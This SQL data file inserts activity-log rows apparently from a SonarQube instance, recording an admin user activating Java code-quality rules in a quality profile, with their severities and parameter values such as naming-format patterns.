INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1771, '2017-11-20 11:09:21.091', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:MaximumInheritanceDepth;ruleKey=squid:MaximumInheritanceDepth;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;param_max=5;param_filteredClasses=;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHkdDbbGRdfPp-q5O');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1772, '2017-11-20 11:09:21.135', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:MissingDeprecatedCheck;ruleKey=squid:MissingDeprecatedCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHkdvbbGRdfPp-q5P');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1773, '2017-11-20 11:09:21.18', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:ModifiersOrderCheck;ruleKey=squid:ModifiersOrderCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHkecbbGRdfPp-q5Q');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1774, '2017-11-20 11:09:21.216', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:ObjectFinalizeCheck;ruleKey=squid:ObjectFinalizeCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHkfAbbGRdfPp-q5R');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1775, '2017-11-20 11:09:21.245', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:ObjectFinalizeOverridenCallsSuperFinalizeCheck;ruleKey=squid:ObjectFinalizeOverridenCallsSuperFinalizeCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHkfdbbGRdfPp-q5S');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1776, '2017-11-20 11:09:21.275', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:ObjectFinalizeOverridenCheck;ruleKey=squid:ObjectFinalizeOverridenCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHkf7bbGRdfPp-q5T');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1777, '2017-11-20 11:09:21.327', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:RedundantThrowsDeclarationCheck;ruleKey=squid:RedundantThrowsDeclarationCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHkgvbbGRdfPp-q5U');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1778, '2017-11-20 11:09:21.369', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S00100;ruleKey=squid:S00100;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;param_format=^[a-z][a-zA-Z0-9]*$;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHkhZbbGRdfPp-q5V');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1779, '2017-11-20 11:09:21.414', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S00101;ruleKey=squid:S00101;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;param_format=^[A-Z][a-zA-Z0-9]*$;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHkiGbbGRdfPp-q5W');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1780, '2017-11-20 11:09:21.457', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S00107;ruleKey=squid:S00107;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;param_max=7;param_constructorMax=7;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHkixbbGRdfPp-q5X');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1781, '2017-11-20 11:09:21.498', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S00108;ruleKey=squid:S00108;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHkjabbGRdfPp-q5Y');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1782, '2017-11-20 11:09:21.543', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S00112;ruleKey=squid:S00112;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHkkHbbGRdfPp-q5Z');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1783, '2017-11-20 11:09:21.587', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S00114;ruleKey=squid:S00114;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;param_format=^[A-Z][a-zA-Z0-9]*$;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHkkzbbGRdfPp-q5a');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1784, '2017-11-20 11:09:21.633', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S00115;ruleKey=squid:S00115;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;param_format=^[A-Z][A-Z0-9]*(_[A-Z0-9]+)*$;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHklhbbGRdfPp-q5b');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1785, '2017-11-20 11:09:21.677', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S00116;ruleKey=squid:S00116;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;param_format=^[a-z][a-zA-Z0-9]*$;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHkmNbbGRdfPp-q5c');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1786, '2017-11-20 11:09:21.72', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S00117;ruleKey=squid:S00117;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;param_format=^[a-z][a-zA-Z0-9]*$;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHkm4bbGRdfPp-q5d');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1787, '2017-11-20 11:09:21.768', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S00119;ruleKey=squid:S00119;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;param_format=^[A-Z][0-9]?$;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHknobbGRdfPp-q5e');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1788, '2017-11-20 11:09:21.8', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S00120;ruleKey=squid:S00120;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;param_format=^[a-z]+(\.[a-z][a-z0-9]*)*$;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHkoIbbGRdfPp-q5f');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1789, '2017-11-20 11:09:21.859', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S106;ruleKey=squid:S106;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHkpDbbGRdfPp-q5g');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1790, '2017-11-20 11:09:21.924', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S1065;ruleKey=squid:S1065;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHkqEbbGRdfPp-q5h');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1791, '2017-11-20 11:09:22.029', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S1066;ruleKey=squid:S1066;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHkrtbbGRdfPp-q5i');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1792, '2017-11-20 11:09:22.101', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S1068;ruleKey=squid:S1068;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHks1bbGRdfPp-q5j');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1793, '2017-11-20 11:09:22.13', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S1075;ruleKey=squid:S1075;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHktSbbGRdfPp-q5k');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1794, '2017-11-20 11:09:22.166', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S1118;ruleKey=squid:S1118;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHkt2bbGRdfPp-q5l');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1795, '2017-11-20 11:09:22.198', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S1125;ruleKey=squid:S1125;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHkuWbbGRdfPp-q5m');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1796, '2017-11-20 11:09:22.228', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S1126;ruleKey=squid:S1126;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHku0bbGRdfPp-q5n');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1797, '2017-11-20 11:09:22.257', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S1133;ruleKey=squid:S1133;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=INFO', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHkvRbbGRdfPp-q5o');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1798, '2017-11-20 11:09:22.287', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S1134;ruleKey=squid:S1134;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHkvvbbGRdfPp-q5p');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1799, '2017-11-20 11:09:22.326', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S1135;ruleKey=squid:S1135;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=INFO', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHkwWbbGRdfPp-q5q');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1800, '2017-11-20 11:09:22.355', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S1141;ruleKey=squid:S1141;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHkwzbbGRdfPp-q5r');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1801, '2017-11-20 11:09:22.384', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S1143;ruleKey=squid:S1143;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHkxQbbGRdfPp-q5s');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1802, '2017-11-20 11:09:22.415', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S1148;ruleKey=squid:S1148;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHkxvbbGRdfPp-q5t');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1803, '2017-11-20 11:09:22.445', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S1149;ruleKey=squid:S1149;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHkyNbbGRdfPp-q5u');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1804, '2017-11-20 11:09:22.475', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S1150;ruleKey=squid:S1150;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHkyrbbGRdfPp-q5v');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1805, '2017-11-20 11:09:22.505', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S1153;ruleKey=squid:S1153;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHkzJbbGRdfPp-q5w');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1806, '2017-11-20 11:09:22.533', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S1155;ruleKey=squid:S1155;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHkzlbbGRdfPp-q5x');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1807, '2017-11-20 11:09:22.562', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S1157;ruleKey=squid:S1157;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHk0CbbGRdfPp-q5y');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1808, '2017-11-20 11:09:22.583', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S1158;ruleKey=squid:S1158;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHk0XbbGRdfPp-q5z');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1809, '2017-11-20 11:09:22.61', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S1161;ruleKey=squid:S1161;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHk0ybbGRdfPp-q50');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1810, '2017-11-20 11:09:22.639', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S1163;ruleKey=squid:S1163;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHk1PbbGRdfPp-q51');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1811, '2017-11-20 11:09:22.687', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S1165;ruleKey=squid:S1165;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHk1_bbGRdfPp-q52');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1812, '2017-11-20 11:09:22.707', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S1168;ruleKey=squid:S1168;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHk2TbbGRdfPp-q53');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1813, '2017-11-20 11:09:22.734', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S1170;ruleKey=squid:S1170;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHk2ubbGRdfPp-q54');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1814, '2017-11-20 11:09:22.764', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S1171;ruleKey=squid:S1171;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHk3MbbGRdfPp-q55');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1815, '2017-11-20 11:09:22.793', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S1172;ruleKey=squid:S1172;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHk3pbbGRdfPp-q56');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1816, '2017-11-20 11:09:22.814', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S1174;ruleKey=squid:S1174;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHk3-bbGRdfPp-q57');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1817, '2017-11-20 11:09:22.852', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S1175;ruleKey=squid:S1175;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHk4kbbGRdfPp-q58');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1818, '2017-11-20 11:09:22.922', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S1181;ruleKey=squid:S1181;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHk5qbbGRdfPp-q59');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1819, '2017-11-20 11:09:22.998', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S1182;ruleKey=squid:S1182;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHk62bbGRdfPp-q5-');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1820, '2017-11-20 11:09:23.09', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S1185;ruleKey=squid:S1185;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHk8SbbGRdfPp-q5_');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1821, '2017-11-20 11:09:23.117', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S1186;ruleKey=squid:S1186;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHk8tbbGRdfPp-q6A');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1822, '2017-11-20 11:09:23.149', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S1190;ruleKey=squid:S1190;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHk9MbbGRdfPp-q6B');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1823, '2017-11-20 11:09:23.168', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S1191;ruleKey=squid:S1191;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;param_Exclude=;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHk9gbbGRdfPp-q6C');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1824, '2017-11-20 11:09:23.202', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S1192;ruleKey=squid:S1192;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;param_threshold=3;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHk-CbbGRdfPp-q6D');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1825, '2017-11-20 11:09:23.238', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S1193;ruleKey=squid:S1193;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHk-mbbGRdfPp-q6E');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1826, '2017-11-20 11:09:23.268', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S1195;ruleKey=squid:S1195;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHk_EbbGRdfPp-q6F');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1827, '2017-11-20 11:09:23.297', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S1197;ruleKey=squid:S1197;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHk_hbbGRdfPp-q6G');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1828, '2017-11-20 11:09:23.317', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S1199;ruleKey=squid:S1199;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHk_1bbGRdfPp-q6H');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1829, '2017-11-20 11:09:23.344', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S1201;ruleKey=squid:S1201;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHlAQbbGRdfPp-q6I');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1830, '2017-11-20 11:09:23.373', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S1206;ruleKey=squid:S1206;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHlAtbbGRdfPp-q6J');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1831, '2017-11-20 11:09:23.397', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S1210;ruleKey=squid:S1210;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHlBFbbGRdfPp-q6K');
